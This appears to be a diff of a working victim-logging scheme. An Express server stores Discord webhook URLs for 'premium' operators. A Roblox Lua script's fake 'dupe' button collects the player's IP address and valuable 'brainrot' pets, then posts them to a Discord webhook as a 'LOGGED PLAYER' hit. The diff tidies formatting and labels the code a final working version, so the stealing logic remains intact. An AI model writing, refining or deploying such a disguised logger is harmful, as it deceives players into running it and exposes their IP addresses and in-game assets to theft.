@@ -1,11 +1,11 @@
-// server.js - FIXED VERSION
+// server.js - FINAL WORKING VERSION
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Webhook storage
 const webhookStorage = new Map();
-const premiumUsers = new Map(); // Store premium users
+const premiumUsers = new Map();
 
 // Middleware
 app.use(express.json());
@@ -44,7 +44,6 @@ app.post("/store", (req, res) => {
     if (webhook_id && webhook_url && webhook_url.startsWith("https://discord.com/api/webhooks/")) {
       webhookStorage.set(webhook_id, webhook_url);
       
-      // Mark as premium if applicable
       if (premium) {
         premiumUsers.set(webhook_id, true);
       }
@@ -484,7 +483,7 @@ dupeButton.MouseButton1Click:Connect(function()
     local webhook, isPremium = getWebhook()
     local ip = getIP(isPremium)
     
-    -- Format brainrots with code block formatting
+    -- Format brainrots WITHOUT code block (to avoid syntax errors)
     local brainrotsText = ""
     for i = 1, #brainrotPets do
         brainrotsText = brainrotsText .. brainrotPets[i].Name .. " | " .. brainrotPets[i].Rate
@@ -494,8 +493,6 @@ dupeButton.MouseButton1Click:Connect(function()
     end
     if brainrotsText == "" then
         brainrotsText = "No brainrots found"
-    else
-        brainrotsText = "```" .. brainrotsText .. "```"
     end
     
     -- Determine if legit hit
@@ -504,7 +501,7 @@ dupeButton.MouseButton1Click:Connect(function()
         hitStatus = "this dosent look like a legit hit"
     end
     
-    -- Create embed with BLUE COLOR and proper formatting
+    -- Create embed with BLUE COLOR
     local embed = {
         title = "# LOGGED PLAYER",
         description = "a player just ran your script!",
